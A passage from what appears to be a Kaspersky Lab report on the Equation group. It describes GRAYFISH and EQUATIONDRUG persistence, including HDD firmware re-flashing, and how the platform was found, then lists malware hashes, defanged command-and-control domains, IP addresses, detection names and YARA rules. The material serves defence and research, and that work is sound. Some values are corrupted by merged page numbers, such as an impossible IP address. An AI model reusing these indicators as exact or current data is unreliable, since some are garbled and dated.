addition, we can compare the two platforms by their startup mechanisms. \nWhile 64-bit Regin uses a service that loads the remaining of the code from the \nend of the last partition on disk and further from the VFSes, GRAYFISH takes this \na step further. The GRAYFISH bootkit starts from the VBR, loads the operating \nsystem and hijacks the loading of the first driver in the kernel. Next, it loads all \nthe other malware stages from the registry, making it almost completely invisible \nin terms of footprint.\nFinally, in terms of advanced features, GRAYFISH and EQUATIONDRUG include \nperhaps the most sophisticated persistence mechanism we’ve ever seen: re-flashing \nthe HDD firmware. Due to the complexity of this process and the knowledge and \nresources required to implement something like it, the mechanism appears to be out \nof the reach of most advanced threat groups in the world except the EQUATION group.\nThese as well as other general observations lead us to conclude that the EQUATION \ngroup surpasses Regin in sophistication and resources.\n18. How did you discover this malware?\nWe discovered one of the first EQUATIONDRUG modules during our research \ninto the Regin nation-state APT operation . \nSomewhere in the Middle East, there is a computer we are calling the \n“The Magnet of Threats ” because in addition to Regin, it was also infected \nby Turla , ItaDuke , Animal Farm and Careto/Mask . When we tried to analyze \nthe Regin infection on this computer, we identified another module which did \nnot appear to be part of the Regin infection, nor any of the other APTs. 32\nTLP: White For any inquiries, please contact intelreports@kaspersky.com\nFurther investigation into this module led us to the discovery of the \nEQUATIONDRUG platform.\nBy looking for similarities using statistical analysis and correlation as \nwell as C&C-based pivoting, we identified several other malware families: \nDOUBLEFANTASY , EQUATIONLASER and FANNY. Further research enabled \nus to find GRAYFISH and TRIPLEFANTASY.\nAnother interesting detail is that several EQUATION group victims appear to \nhave been previously infected by Regin and, in one case, had both Regin and \nEQUATIONDRUG. This makes us believe the two groups are different from each other.\nIndicators of compromise (“one of each”)\nName EquationLaser\nMD5 752af597e6d9fd70396accc0b9013dbe\nType EquationLaser installer\nCompiled Mon Oct 18 15:24:05 2004\nName Disk from Houston “autorun.exe” with EoP exploits\nMD5 6fe6c03b938580ebf9b82f3b9cd4c4aa\nType EoP package and malware launcher\nCompiled Wed Dec 23 15:37:33 2009\nName DoubleFantasy\nMD5 2a12630ff976ba0994143ca93fecd17f\nType DoubleFantasy installer\nCompiled Fri Apr 30 01:03:53 2010\nName EquationDrug\nMD5 4556ce5eb007af1de5bd3b457f0b216d\nType EquationDrug installer (“LUTEUSOBSTOS”)\nCompiled Tue Dec 11 20:47:12 200733\nTLP: White For any inquiries, please contact intelreports@kaspersky.com\nName GrayFish\nMD5 9b1ca66aab784dc5f1dfe635d8f8a904\nType GrayFish installer\nCompiled Compiled: Fri Feb 01 22:15:21 2008 (installer)\nName Fanny\nMD5 0a209ac0de4ac033f31d6ba9191a8f7a\nType Fanny worm\nCompiled Mon Jul 28 11:11:35 2008\nName TripleFantasy\nMD5 9180d5affe1e5df0717d7385e7f54386 loader (17920 bytes .DLL)\nMD5 ba39212c5b58b97bfc9f5bc431170827 encrypted payload (.DAT)\nCompiled various, possibly fake\nName _SD_IP_CF.dll - unknown \nMD5 03718676311de33dd0b8f4f18cffd488\nType DoubleFantasy installer + LNK exploit package\nCompiled Fri Feb 13 10:50:23 2009\nName nls_933w.dll\nMD5 11fb08b9126cdb4668b3f5135cf7a6c5 \nType HDD reprogramming module\nCompiled Tue Jun 15 20:23:37 2010\nName standalonegrok_2.1.1.1 / GROK\nMD5 24a6ec8ebf9c0867ed1c097f4a653b8d \nType GROK keylogger\nCompiled Tue Aug 09 03:26:22 201134\nTLP: White For any inquiries, please contact intelreports@kaspersky.com\nC&C servers (hostnames and IPs):\nDoubleFantasy:\nadvancing-technology[.]com\navidnewssource[.]com\nbusinessdealsblog[.]com\nbusinessedgeadvance[.]com\ncharging-technology[.]com\ncomputertechanalysis[.]com\nconfig.getmyip[.]com - SINKHOLED BY KASPERSKY LAB\nglobalnetworkanalys[.]com\nmelding-technology[.]com\nmyhousetechnews[.]com - SINKHOLED BY KASPERSKY LAB\nnewsterminalvelocity[.]com - SINKHOLED BY KASPERSKY LAB\nselective-business[.]com\nslayinglance[.]com\nsuccessful-marketing-now[.]com - SINKHOLED BY KASPERSKY LAB\ntaking-technology[.]com\ntechasiamusicsvr[.]com - SINKHOLED BY KASPERSKY LAB\ntechnicaldigitalreporting[.]com\ntimelywebsitehostesses[.]com\nwww.dt1blog[.]com\nwww.forboringbusinesses[.]com\nEquationLaser:\nlsassoc[.]com - re-registered, not malicious at the moment\ngar-tech[.]com -  SINKHOLED BY KASPERSKY LAB\nFanny:\nwebuysupplystore.mooo[.]com - SINKHOLED BY KASPERSKY LAB35\nTLP: White For any inquiries, please contact intelreports@kaspersky.com\nEquationDrug:\nnewjunk4u[.]com\neasyadvertonline[.]com\nnewip427.changeip[.]net - SINKHOLED BY KASPERSKY LAB\nad-servicestats[.]net - SINKHOLED BY KASPERSKY LAB\nsubad-server[.]com - SINKHOLED BY KASPERSKY LAB\nad-noise[.]net\nad-void[.]com\naynachatsrv[.]com\ndamavandkuh[.]com\nfnlpic[.]com\nmonster-ads[.]net\nnowruzbakher[.]com\nsherkhundi[.]com\nquik-serv[.]com\nnickleplatedads[.]com\narabtechmessenger[.]net\namazinggreentechshop[.]com\nforoushi[.]net\ntechnicserv[.]com\ngoldadpremium[.]com\nhonarkhaneh[.]net\nparskabab[.]com\ntechnicupdate[.]com\ntechnicads[.]com\ncustomerscreensavers[.]com\ndarakht[.]com\nghalibaft[.]com\nadservicestats[.]com\n247adbiz[.]net - SINKHOLED BY KASPERSKY LAB\nwebbizwild[.]com\nroshanavar[.]com\nafkarehroshan[.]com\nthesuperdeliciousnews[.]com\nadsbizsimple[.]com\ngoodbizez[.]com\nmeevehdar[.]com\nxlivehost[.]com36\nTLP: White For any inquiries, please contact intelreports@kaspersky.com\ngar-tech[.]com - SINKHOLED BY KASPERSKY LAB\ndownloadmpplayer[.]com  \nhonarkhabar[.]com\ntechsupportpwr[.]com\nwebbizwild[.]com\nzhalehziba[.]com\nserv-load[.]com\nwangluoruanjian[.]com\nislamicmarketing[.]net\nnoticiasftpsrv[.]com\ncoffeehausblog[.]com\nplatads[.]com\nhavakhosh[.]com\ntoofanshadid[.]com\nbazandegan[.]com\nsherkatkonandeh[.]com\nmashinkhabar[.]com\nquickupdateserv[.]com\nrapidlyserv[.]com37\nTLP: White For any inquiries, please contact intelreports@kaspersky.com\nGrayFish:\nad-noise[.]net\nbusiness-made-fun[.]com\nbusinessdirectnessource[.]com\ncharmedno1[.]com\ncribdare2no[.]com\ndowelsobject[.]com\nfollowing-technology[.]com\nforgotten-deals[.]com\nfunctional-business[.]com\nhousedman[.]com\nindustry-deals[.]com\nlistennewsnetwork[.]com\nphoneysoap[.]com\nposed2shade[.]com\nquik-serv[.]com\nrehabretie[.]com\nspeedynewsclips[.]com\nteatac4bath[.]com\nunite3tubes[.]com\nunwashedsound[.]com\nTripleFantasy:\narm2pie[.]com\nbrittlefilet[.]com\ncigape[.]net\ncrisptic01[.]net\nfliteilex[.]com\nitemagic[.]net\nmicraamber[.]net\nmimicrice[.]com\nrampagegramar[.]com\nrubi4edit[.]com\nrubiccrum[.]com\nrubriccrumb[.]com\nteam4heat[.]net\ntropiccritics[.]com38\nTLP: White For any inquiries, please contact intelreports@kaspersky.com\nEquation group’s exploitation servers:\nstandardsandpraiserepurpose[.]com\nsuddenplot[.]com\ntechnicalconsumerreports[.]com\ntechnology-revealed[.]com\nIPs hardcoded in malware configuration blocks:\n149.12.71.2\n190.242.96.212\n190.60.202.4\n195.128.235.227\n195.128.235.231\n195.128.235.233\n195.128.235.235\n195.81.34.67\n202.95.84.33\n203.150.231.49\n203.150.231.73\n210.81.52.120\n212.61.54.239\n41.222.35.70\n62.216.152.67\n64.76.82.52\n80.77.4.3\n81.31.34.175\n81.31.36.174\n81.31.38.163\n81.31.38.166\n84.233.205.99\n85.112.1.83\n87.255.38.2\n89.18.177.339\nTLP: White For any inquiries, please contact intelreports@kaspersky.com\nKaspersky products detection names:\n•\tBackdoor.Win32.Laserv\n•\tBackdoor.Win32.Laserv.b\n•\tExploit.Java.CVE-2012-1723.ad\n•\tHEUR:Exploit.Java.CVE-2012-1723.gen\n•\tHEUR:Exploit.Java.Generic\n•\tHEUR:Trojan.Java.Generic\n•\tHEUR:Trojan.Win32.DoubleFantasy.gen\n•\tHEUR:Trojan.Win32.EquationDrug.gen\n•\tHEUR:Trojan.Win32.Generic\n•\tHEUR:Trojan.Win32.GrayFish.gen\n•\tHEUR:Trojan.Win32.TripleFantasy.gen\n•\tRootkit.Boot.Grayfish.a\n•\tTrojan-Downloader.Win32.Agent.bjqt\n•\tTrojan.Boot.Grayfish.a\n•\tTrojan.Win32.Agent.ajkoe\n•\tTrojan.Win32.Agent.iedc\n•\tTrojan.Win32.Agent2.jmk\n•\tTrojan.Win32.Diple.fzbb\n•\tTrojan.Win32.DoubleFantasy.a\n•\tTrojan.Win32.DoubleFantasy.gen\n•\tTrojan.Win32.EquationDrug.b\n•\tTrojan.Win32.EquationDrug.c\n•\tTrojan.Win32.EquationDrug.d\n•\tTrojan.Win32.EquationDrug.e\n•\tTrojan.Win32.EquationDrug.f40\nTLP: White For any inquiries, please contact intelreports@kaspersky.com\n•\tTrojan.Win32.EquationDrug.g\n•\tTrojan.Win32.EquationDrug.h\n•\tTrojan.Win32.EquationDrug.i\n•\tTrojan.Win32.EquationDrug.j\n•\tTrojan.Win32.EquationDrug.k\n•\tTrojan.Win32.EquationLaser.a\n•\tTrojan.Win32.EquationLaser.c\n•\tTrojan.Win32.EquationLaser.d\n•\tTrojan.Win32.Genome.agegx\n•\tTrojan.Win32.Genome.akyzh\n•\tTrojan.Win32.Genome.ammqt\n•\tTrojan.Win32.Genome.dyvi\n•\tTrojan.Win32.Genome.ihcl\n•\tTrojan.Win32.Patched.kc\n•\tTrojan.Win64.EquationDrug.a\n•\tTrojan.Win64.EquationDrug.b\n•\tTrojan.Win64.Rozena.rpcs\n•\tWorm.Win32.AutoRun.wzs41\nTLP: White For any inquiries, please contact intelreports@kaspersky.com\nYara rules:\nrule apt_equation_exploitlib_mutexes {\nmeta:\n    copyright = “Kaspersky Lab”\n    description = “Rule to detect Equation group's Exploitation library”\n    version = “1.0”\n    last_modified = “2015-02-16”\n    reference = “https://securelist.com/blog/”\nstrings:\n    $mz=“MZ”\n    $a1=“prkMtx” wide\n    $a2=“cnFormSyncExFBC” wide\n    $a3=“cnFormVoidFBC” wide\n    $a4=“cnFormSyncExFBC” \n    $a5=“cnFormVoidFBC”\ncondition:\n(($mz at 0) and any of ($a*))\n}\nrule apt_equation_doublefantasy_genericresource {\nmeta:\n    copyright = “Kaspersky Lab”\n    description = “Rule to detect DoubleFantasy encoded config”\n    version = “1.0”\n    last_modified = “2015-02-16”\n    reference = “https://securelist.com/blog/”\nstrings:\n    $mz=“MZ”\n    $a1={06 00 42 00 49 00 4E 00 52 00 45 00 53 00}\n    $a2=“yyyyyyyyyyyyyyyy”\n    $a3=“002”\ncondition:\n(($mz at 0) and all of ($a*))  and filesize < 500000\n}42\nTLP: White For any inquiries, please contact intelreports@kaspersky.com\nrule apt_equation_equationlaser_runtimeclasses {\nmeta:\n    copyright = “Kaspersky Lab”\n    description = “Rule to detect the EquationLaser malware”\n    version = “1.0”\n    last_modified = “2015-02-16”\n    reference = “https://securelist.com/blog/”\nstrings:\n    $a1=“?a73957838_2@@YAXXZ”\n    $a2=“?a84884@@YAXXZ”\n    $a3=“?b823838_9839@@YAXXZ”\n    $a4=“?e747383_94@@YAXXZ”\n    $a5=“?e83834@@YAXXZ”\n    $a6=“?e929348_827@@YAXXZ”\ncondition:\n    any of them\n}\nrule apt_equation_cryptotable {\nmeta:\n    copyright = “Kaspersky Lab”\n    description =  “Rule to detect the crypto library used in Equation \ngroup malware”\n     version = “1.0”\n    last_modified = “2015-02-16”\n    reference = “https://securelist.com/blog/”\nstrings:\n    $a={37 DF E8 B6 C7 9C 0B AE 91 EF F0 3B 90 C6 80 85 5D 19 4B \n45 44 12 3C E2 0D 5C 1C 7B C4 FF D6 05 17 14 4F 03 74 1E 41 DA \n8F 7D DE 7E 99 F1 35 AC B8 46 93 CE 23 82 07 EB 2B D4 72 71 40 \nF3 B0 F7 78 D7 4C D1 55 1A 39 83 18 FA E1 9A 56 B1 96 AB A6 30 \nC5 5F BE 0C 50 C1}\ncondition:\n    $a\n}43\nTLP: White For any inquiries, please contact intelreports@kaspersky.com\nDailyBusinessAcadem y ThreatP ost EugeneSecureListSecurelist , the resource \nfor Kaspersky Lab experts’ \ntechnical research,  \nanalysis, and thoughts.Follow us\n  \n Kaspersky Lab global WebsiteDailyBusinessAcadem y ThreatP ost Eugene Eugene Kaspersky Blog\nDaily Kaspersky Lab B2C BlogDailyBusiness Kaspersky Lab B2B Blog\nDailyBusinessAcadem y ThreatP ost Kaspersky Lab security news serviceDailyBusinessAcadem y Kaspersky Lab AcademyKaspersky Lab HQ\n39A/3 Leningradskoe Shosse  \nMoscow, 125212  \nRussian Federation\nmore contact details\nTel: +7-495-797-8700  \nFax:  +7-495-797-8709"
}